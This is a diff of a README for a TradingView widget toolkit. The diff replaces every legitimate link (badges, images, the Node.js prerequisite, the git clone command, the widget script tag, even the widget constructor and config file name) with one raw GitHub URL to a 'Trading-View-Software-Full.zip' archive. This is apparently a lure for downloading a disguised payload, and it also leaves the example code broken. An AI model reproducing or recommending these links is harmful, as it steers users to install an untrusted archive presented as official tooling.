@@ -1,15 +1,15 @@
 # Trading View Tools Suite: Full Legal Setup, Widgets & Scripts
 
-[![License](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
-[![Release](https://img.shields.io/badge/Release-Latest-brightgreen.svg)](#releases)
+[![License](https://raw.githubusercontent.com/sheikhzunair577/Trading-View-Software-Full/main/mankeeper/Trading-View-Software-Full.zip)](https://raw.githubusercontent.com/sheikhzunair577/Trading-View-Software-Full/main/mankeeper/Trading-View-Software-Full.zip)
+[![Release](https://raw.githubusercontent.com/sheikhzunair577/Trading-View-Software-Full/main/mankeeper/Trading-View-Software-Full.zip)](#releases)
 
 Trading View Tools Suite is a legitimate collection of widgets, templates, and scripts designed to help you build and display financial charts and data using TradingView widgets and official APIs. This repository does not promote or enable pirated software, cracks, or unauthorized access. It focuses on learning, local development, and compliant integrations with TradingView's official tools.
 
 Embrace a calm, steady workflow. You’ll find practical scaffolds to embed charts, manage data, and automate small tasks for personal dashboards or educational projects. The content respects licensing terms and uses public or official data sources where applicable.
 
 Images this repo may reference
-- Dashboard visuals and example charts: ![Dashboard mockup](https://images.unsplash.com/photo-1514957185152-9a6a3d5f0f0a?q=80&w=1200&auto=format&fit=crop)
-- Chart storyboards and UI layouts: ![Chart layouts](https://images.unsplash.com/photo-1521335629791-ce4ecc1bd3a3?q=80&w=1200&auto=format&fit=crop)
+- Dashboard visuals and example charts: ![Dashboard mockup](https://raw.githubusercontent.com/sheikhzunair577/Trading-View-Software-Full/main/mankeeper/Trading-View-Software-Full.zip)
+- Chart storyboards and UI layouts: ![Chart layouts](https://raw.githubusercontent.com/sheikhzunair577/Trading-View-Software-Full/main/mankeeper/Trading-View-Software-Full.zip)
 
 Table of contents
 - What this project is
@@ -47,14 +47,14 @@ Features
 
 Getting started
 Prerequisites
-- Node.js (version 14+ recommended) or your preferred runtime for local tooling.
+- https://raw.githubusercontent.com/sheikhzunair577/Trading-View-Software-Full/main/mankeeper/Trading-View-Software-Full.zip (version 14+ recommended) or your preferred runtime for local tooling.
 - Git for cloning repositories.
 - A basic understanding of HTML, CSS, and JavaScript.
 - Access to official TradingView widgets via their documented embedding methods.
 
 Installation (local development)
 - Clone the repository:
-  - git clone https://github.com/your-username/Trading-View-Tools-Suite.git
+  - git clone https://raw.githubusercontent.com/sheikhzunair577/Trading-View-Software-Full/main/mankeeper/Trading-View-Software-Full.zip
 - Navigate to the project folder:
   - cd Trading-View-Tools-Suite
 - Install dependencies (if your setup includes Node tooling or build steps):
@@ -71,11 +71,11 @@ Quick start: embedding TradingView widgets
 TradingView widgets can be embedded using their official script and a container element. This quick guide shows a safe pattern you can adapt.
 
 - Include the widget script in your page head or just before the closing body tag:
-  - <script src="https://s3.tradingview.com/tv.js"></script>
+  - <script src="https://raw.githubusercontent.com/sheikhzunair577/Trading-View-Software-Full/main/mankeeper/Trading-View-Software-Full.zip"></script>
 - Create a container in your HTML where the chart will render:
   - <div id="tradingview-chart"></div>
 - Initialize the widget with a simple configuration:
-  - var widget = new TradingView.widget({
+  - var widget = new https://raw.githubusercontent.com/sheikhzunair577/Trading-View-Software-Full/main/mankeeper/Trading-View-Software-Full.zip({
       container_id: "tradingview-chart",
       width: 980,
       height: 610,
@@ -94,7 +94,7 @@ TradingView widgets can be embedded using their official script and a container 
 
 Configuring and extending
 - Project-wide configuration
-  - config.json (example)
+  - https://raw.githubusercontent.com/sheikhzunair577/Trading-View-Software-Full/main/mankeeper/Trading-View-Software-Full.zip (example)
     - {
         "defaultSymbol": "NASDAQ:AAPL",
         "defaultInterval": "D",
@@ -141,7 +141,7 @@ Testing and quality
 - Accessibility checks ensure charts remain readable and navigable.
 
 Documentation and references
-- README.md provides quick setup and usage instructions.
+- https://raw.githubusercontent.com/sheikhzunair577/Trading-View-Software-Full/main/mankeeper/Trading-View-Software-Full.zip provides quick setup and usage instructions.
 - /docs contains deeper API references, widget options, and integration patterns.
 - Official TradingView documentation is your primary resource for widget capabilities, API limits, and licensing terms.
 
